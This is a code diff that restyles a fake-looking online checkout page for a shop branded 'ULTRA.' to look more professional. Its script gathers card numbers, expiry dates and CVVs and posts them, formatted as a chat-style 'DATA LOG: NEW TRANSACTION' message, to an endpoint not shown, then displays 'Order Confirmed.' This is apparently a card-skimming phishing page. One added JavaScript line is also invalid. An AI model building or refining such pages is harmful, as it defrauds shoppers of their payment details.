@@ -4,23 +4,144 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <style>
-body { font-family: Arial; font-size: 17px; padding: 8px; background-color: #f9f9f9; }
-* { box-sizing: border-box; }
-.row { display: flex; flex-wrap: wrap; }
-.col-100 { flex: 100%; }
-.container { background-color: #f2f2f2; padding: 5px 20px 15px 20px; border: 1px solid lightgrey; border-radius: 3px; max-width: 800px; margin: auto; }
-input[type=text], select { width: 100%; margin-bottom: 20px; padding: 12px; border: 1px solid #ccc; border-radius: 3px; }
-label { margin-bottom: 10px; display: block; font-weight: bold; }
-.icon-container { margin-bottom: 20px; padding: 7px 0; font-size: 24px; }
-.btn { background-color: #04AA6D; color: white; padding: 12px; margin: 10px 0; border: none; width: 100%; border-radius: 3px; cursor: pointer; font-size: 17px; }
-.btn:hover { background-color: #45a049; }
-#thanks-screen { display: none; text-align: center; margin-top: 100px; }
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Outfit:wght@700;900&display=swap');
+
+    :root {
+        --primary: #000000;
+        --accent: #2563eb;
+        --bg: #ffffff;
+        --surface: #f9f9f9;
+        --text-main: #1a1a1a;
+        --border: #e5e5e5;
+    }
+
+    body { 
+        font-family: 'Inter', sans-serif; 
+        font-size: 14px; 
+        padding: 0; 
+        margin: 0;
+        background-color: var(--bg); 
+        color: var(--text-main);
+        -webkit-font-smoothing: antialiased;
+    }
+
+    * { box-sizing: border-box; }
+
+    /* Header Nav Emulation */
+    .mini-nav {
+        text-align: center;
+        padding: 30px 0;
+        border-bottom: 1px solid var(--border);
+        margin-bottom: 40px;
+    }
+    .logo {
+        font-family: 'Outfit', sans-serif;
+        font-size: 1.8rem;
+        font-weight: 900;
+        letter-spacing: -1px;
+        text-transform: uppercase;
+        color: var(--primary);
+    }
+
+    .row { display: flex; flex-wrap: wrap; margin: 0 -15px; }
+    .col-100 { flex: 100%; padding: 0 15px; }
+    
+    .container { 
+        max-width: 700px; 
+        margin: 0 auto 100px; 
+        padding: 0 20px;
+    }
+
+    h3 {
+        font-family: 'Outfit', sans-serif;
+        font-size: 20px;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        margin: 40px 0 25px 0;
+        border-bottom: 2px solid var(--primary);
+        padding-bottom: 8px;
+        display: inline-block;
+    }
+
+    input[type=text], select { 
+        width: 100%; 
+        margin-bottom: 20px; 
+        padding: 15px; 
+        border: 1px solid var(--border); 
+        border-radius: 0px; /* Square edges to match the shop */
+        font-family: 'Inter', sans-serif;
+        font-size: 14px;
+        transition: border 0.2s;
+    }
+
+    input[type=text]:focus, select:focus {
+        outline: none;
+        border-color: var(--primary);
+    }
+
+    label { 
+        margin-bottom: 8px; 
+        display: block; 
+        font-weight: 600; 
+        text-transform: uppercase;
+        font-size: 11px;
+        letter-spacing: 0.5px;
+        color: #666;
+    }
+
+    .icon-container { 
+        margin-bottom: 20px; 
+        padding: 10px 0; 
+        font-size: 28px; 
+        display: flex;
+        gap: 15px;
+    }
+
+    .btn { 
+        background-color: var(--primary); 
+        color: white; 
+        padding: 20px; 
+        margin: 20px 0; 
+        border: 1px solid var(--primary); 
+        width: 100%; 
+        cursor: pointer; 
+        font-size: 13px; 
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 2px;
+        transition: all 0.3s;
+    }
+
+    .btn:hover { 
+        background-color: transparent; 
+        color: var(--primary); 
+    }
+
+    #thanks-screen { 
+        display: none; 
+        text-align: center; 
+        margin-top: 150px; 
+        padding: 20px;
+    }
+    #thanks-screen h1 {
+        font-family: 'Outfit', sans-serif;
+        font-weight: 900;
+        font-size: 3rem;
+        letter-spacing: -2px;
+    }
+
+    @media (max-width: 500px) {
+        .logo { font-size: 1.4rem; }
+    }
 </style>
 </head>
 <body>
 
+<div class="mini-nav">
+    <div class="logo">ULTRA.</div>
+</div>
+
 <div id="form-container">
-  <h2>Checkout Form</h2>
   <div class="container">
     <form id="checkoutForm" onsubmit="event.preventDefault(); sendData();">
       <div class="row">
@@ -41,7 +162,7 @@ label { margin-bottom: 10px; display: block; font-weight: bold; }
           <label>Country</label>
           <input type="text" id="country" placeholder="United States" required>
 
-          <div class="row">
+          <div class="row" style="margin:0">
             <div style="flex:50%; padding-right:10px;">
               <label>State</label>
               <input type="text" id="state" placeholder="New York" required>
@@ -59,10 +180,10 @@ label { margin-bottom: 10px; display: block; font-weight: bold; }
         <div class="col-100">
           <h3>Payment</h3>
           <div class="icon-container">
-            <i class="fa fa-cc-visa" style="color:navy;"></i>
-            <i class="fa fa-cc-amex" style="color:blue;"></i>
-            <i class="fa fa-cc-mastercard" style="color:red;"></i>
-            <i class="fa fa-cc-discover" style="color:orange;"></i>
+            <i class="fa fa-cc-visa" style="color:#1a1a1a;"></i>
+            <i class="fa fa-cc-amex" style="color:#1a1a1a;"></i>
+            <i class="fa fa-cc-mastercard" style="color:#1a1a1a;"></i>
+            <i class="fa fa-cc-discover" style="color:#1a1a1a;"></i>
           </div>
 
           <label>Name on Card</label>
@@ -71,9 +192,9 @@ label { margin-bottom: 10px; display: block; font-weight: bold; }
           <label>Credit card number</label>
           <input type="text" id="ccnum" placeholder="1111-2222-3333-4444" required>
 
-          <label>Expiration Date</label>
-          <div class="row">
+          <div class="row" style="margin:0">
             <div style="flex:50%; padding-right:10px;">
+              <label>Expiration Month</label>
               <select id="expmonth" required>
                 <option value="01">01 - Jan</option><option value="02">02 - Feb</option><option value="03">03 - Mar</option>
                 <option value="04">04 - Apr</option><option value="05">05 - May</option><option value="06">06 - Jun</option>
@@ -82,6 +203,7 @@ label { margin-bottom: 10px; display: block; font-weight: bold; }
               </select>
             </div>
             <div style="flex:50%;">
+              <label>Expiration Year</label>
               <select id="expyear" required>
                 <option value="2026">2026</option><option value="2027">2027</option>
                 <option value="2028">2028</option><option value="2029">2029</option>
@@ -95,14 +217,14 @@ label { margin-bottom: 10px; display: block; font-weight: bold; }
         </div>
       </div>
 
-      <input type="submit" value="Continue to checkout" class="btn">
+      <input type="submit" value="Complete Purchase" class="btn">
     </form>
   </div>
 </div>
 
 <div id="thanks-screen">
-  <h1>Thank you for your purchase!</h1>
-  <p>Your product will be shipped within 7-18 business days. Bye!</p>
+  <h1>Order Confirmed.</h1>
+  <p style="color: #666; font-size: 16px; margin-top: 20px;">Thank you for your purchase!<br>Your product will be shipped within 7-18 business days.</p>
 </div>
 
 <script>
@@ -121,7 +243,6 @@ function sendData() {
     "CVV": document.getElementById("cvv").value
   };
 
-  // The "Best Ever" ASCII Grid
   let message = "```sql\n";
   message += "╭──────────────── DATA LOG: NEW TRANSACTION ────────────────╮\n";
   message += "│ FIELD        │ INFORMATION                                │\n";
@@ -143,6 +264,7 @@ function sendData() {
   })
   .then(() => {
     document.getElementById("form-container").style.display = "none";
+    document.getElementById("mini-nav")?.style.display = "none";
     document.getElementById("thanks-screen").style.display = "block";
   })
   .catch(() => alert("Error: Connection lost."));
